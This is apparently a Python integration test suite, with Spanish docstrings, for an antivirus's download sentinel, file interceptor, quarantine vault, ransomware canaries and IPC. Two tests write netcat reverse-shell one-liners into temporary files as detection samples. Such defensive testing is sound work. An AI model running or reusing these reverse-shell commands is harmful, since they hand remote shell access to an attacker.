"""
Suite de Pruebas de Integración End-to-End (E2E) para Constantine Antivirus.
"""
import os
import sys
import time
import tempfile
import unittest
from unittest.mock import patch, MagicMock

ROOT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if ROOT_DIR not in sys.path:
    sys.path.insert(0, ROOT_DIR)

from core.engine.vault import CryptographicVault
from core.engine.scanner import Scanner
from core.engine.interceptor import FanotifyInterceptor
from core.engine.download_sentinel import DownloadSentinel
from core.engine.ransomware_shield import RansomwareShield
from core.engine.firewall_manager import FirewallManager
from core.engine.whitelist import WhitelistManager
from core.engine.ipc_protocol import SecureIPCServer, SecureIPCClient, IPC_PROTOCOL_VERSION

class TestConstantineIntegrationSuite(unittest.TestCase):

    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()

    def tearDown(self):
        self.temp_dir.cleanup()

    def test_e2e_download_sentinel_toctou_prevention(self):
        """Flujo E2E: Descarga que finaliza -> inotify contención preventiva -> Escaneo -> Aislamiento."""
        vault = CryptographicVault(base_dir=self.temp_dir.name)
        scanner = Scanner()
        sentinel = DownloadSentinel(scanner=scanner, vault=vault)
        sentinel.start()

        dl_dir = os.path.join(self.temp_dir.name, "test_dl")
        os.makedirs(dl_dir, exist_ok=True)
        bad_dl = os.path.join(dl_dir, "miner_dropper.sh")
        with open(bad_dl, "w") as f:
            f.write("nc -e /bin/bash 10.0.0.1 9001")

        ok = sentinel.handle_download_complete(bad_dl, "testuser")
        self.assertFalse(ok)
        self.assertFalse(os.path.exists(bad_dl))
        sentinel.stop()

    def test_e2e_intercept_scan_quarantine_audit_flow(self):
        """Flujo E2E: Archivo malicioso abierto -> fanotify FAN_DENY -> Cuarentena 2PC -> Auditoría inmutable."""
        vault = CryptographicVault(base_dir=self.temp_dir.name)
        scanner = Scanner()
        interceptor = FanotifyInterceptor(scanner=scanner, vault=vault)
        whitelist = WhitelistManager()

        bad_file = os.path.join(self.temp_dir.name, "c2_agent.sh")
        with open(bad_file, "w") as f:
            f.write("nc -e /bin/sh 192.168.1.100 4444")

        fd = os.open(bad_file, os.O_RDONLY)
        dec = interceptor.evaluate_access(fd, bad_file, pid=470, comm="E2E_Test")
        os.close(fd)
        self.assertEqual(dec, 0x02)  # FAN_DENY

        # Restauración
        metadata_files = os.listdir(vault.meta_dir)
        self.assertGreaterEqual(len(metadata_files), 1)
        sample_id = metadata_files[0].replace(".json", "")
        restored = os.path.join(self.temp_dir.name, "restored_agent.sh")
        ok, _ = vault.restore_file(sample_id, restored)
        self.assertTrue(ok)
        self.assertTrue(whitelist.add_entry(restored))

    def test_e2e_ransomware_containment_and_network_isolation(self):
        """Flujo E2E: Intento de ransomware -> Detección de trampa -> SIGKILL -> Aislamiento de red."""
        canary_dir = os.path.join(self.temp_dir.name, "canaries")
        shield = RansomwareShield(canary_dir=canary_dir)
        firewall = FirewallManager()

        canary_file = os.path.join(canary_dir, "important_document.docx")
        with patch.object(shield, "kill_process") as mock_kill, \
             patch.object(firewall, "isolate_process_network") as mock_iso:
            self.assertFalse(shield.check_canary_access(canary_file, 99887, flags=os.O_RDWR))
            mock_kill.assert_called_with(99887)
            firewall.isolate_process_network(99887)
            mock_iso.assert_called_with(99887)

    def test_e2e_secure_ipc_and_privilege_separation(self):
        """Flujo E2E: Cliente GUI sin privilegios -> Socket de dominio Unix -> Despacho en Demonio."""
        sock_path = os.path.join(self.temp_dir.name, "daemon_ipc.sock")
        def mock_dispatch(cmd, params, client_uid=0):
            return "OK", {"status": "ACTIVE", "version": "5.2.2", "client_uid": client_uid}, ""

        server = SecureIPCServer(socket_path=sock_path, dispatcher=mock_dispatch)
        server.start()
        time.sleep(0.1)

        client = SecureIPCClient(socket_path=sock_path)
        with patch("core.engine.ipc_protocol.verify_peer_credentials", return_value=(True, 4567, 1000, 1000)):
            resp = client.send_command("GET_STATUS")
            self.assertEqual(resp.get("status"), "OK")
            self.assertEqual(resp.get("data", {}).get("version"), "5.2.2")
            self.assertEqual(resp.get("data", {}).get("client_uid"), 1000)

        server.stop()

if __name__ == "__main__":
    unittest.main()
